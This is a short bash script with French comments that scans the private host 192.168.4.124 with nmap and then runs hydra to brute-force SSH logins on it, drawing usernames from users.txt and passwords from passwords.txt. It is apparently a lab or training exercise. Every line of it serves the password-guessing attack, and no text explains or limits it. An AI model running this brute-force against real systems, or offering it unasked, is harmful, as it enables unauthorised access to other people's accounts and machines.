#!/bin/bash

# on scanne la machine 
echo "##### On regarde la machine #####"
nmap 192.168.4.124

echo "##### liste des utilisateurs #####"
 cat users.txt
echo "##### liste des mots de passe #####" 
 cat passwords.txt

echo "##### lancement de l'attaque brute force #####" 
 hydra -L users.txt -P passwords.txt 192.168.4.124 -t 2 -s 22 ssh
